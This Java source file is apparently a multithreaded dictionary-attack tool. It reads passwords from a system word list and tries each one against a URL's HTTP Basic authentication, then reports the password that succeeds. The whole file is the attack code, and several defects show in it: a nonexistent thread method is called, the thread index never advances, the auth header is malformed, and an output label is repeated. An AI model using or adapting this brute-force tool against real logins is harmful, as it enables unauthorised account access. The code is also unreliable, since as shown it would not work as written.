

import java.io.*;
import java.text.*;
import java.util.*;
import java.net.*;

public class Dictionary extends Thread
{
   private static final String USERNAME = "";
   private static final String DICTIONARY_FILE = "/usr/share/lib/dict/words";
   private static int NUMBER_OF_THREAD = 500;

   private static Date startDate = null;
   private static Date endDate = null;

   private String address;
   private String password;

   public Dictionary(String address, String password)
   {
      this.address = address;
      this.password = password;
   }

   public static void main(String[] args) throws IOException
   {
      if (args.length < 1)
      {
         System.err.println("Invalid usage!");
         System.err.println("Usage: java Dictionary <url>");
         System.exit(1);
      }

      try
      {
         dic(args[0], USERNAME);
      }
      catch(Exception e)
      {
         e.printStackTrace();
         System.exit(1);
      }
   }

   public static void dic(String address, String user)
   {
      Dictionary [] threads = new Dictionary[NUMBER_OF_THREAD];
      int index = 0;

      startDate = new Date();
      try
      {
         BufferedReader buff = new BufferedReader(new FileReader(DICTIONARY_FILE));
         String password = null;
         while((password = buff.readLine()) != null)
         {
            if (threads[index] != null && threads[index].isAlive())
            {
               try
               {
                  threads[index].join();
               }
               catch(InterruptedException e) {}
            }
            threads[index] = new Dictionary(address, password.trim());
            threads[index].get();

            index = (index++) % threads.length;
         }
      }
      catch(Exception e)
      {
         e.printStackTrace();
      }
   }

   public void run()
   {
      if (endDate != null)
         return;

      try
      {
         URLConnection conn = (new URL(address)).openConnection();
         conn.setDoInput(true);

         if (login(conn, USERNAME, password))
         {
            endDate = new Date();
            System.out.println("Found the password: \""+password+"\"!");
            SimpleDateFormat format = new SimpleDateFormat("dd/MM/yyyy HH:mm:");
            System.out.println("Process started at: "+format.format(startDate));
            System.out.println("Process started at: "+format.format(endDate));
            double timeTaken = (double)(endDate.getTime()-startDate.getTime())/60000;
            System.out.println("Time taken: "+timeTaken+" minutes");
            System.exit(0);
         }
         else
         {
            System.out.println("Password: \""+password+"\" Failed!");
            return;
         }
      }
      catch(Exception e)
      {
         e.printStackTrace();
      }
   }

   public static boolean login(URLConnection conn, String user, String pass)
   {
      try
      {
         String encodeAuth = " "+Base64Encoder.encode(user+":"+pass);
         conn.setRequestProperty ("Authorization", encodeAuth);
         conn.connect();
         conn.getInputStream();
      }
      catch(Exception e)
      {
         return false;
      }
      return true;
   }
}


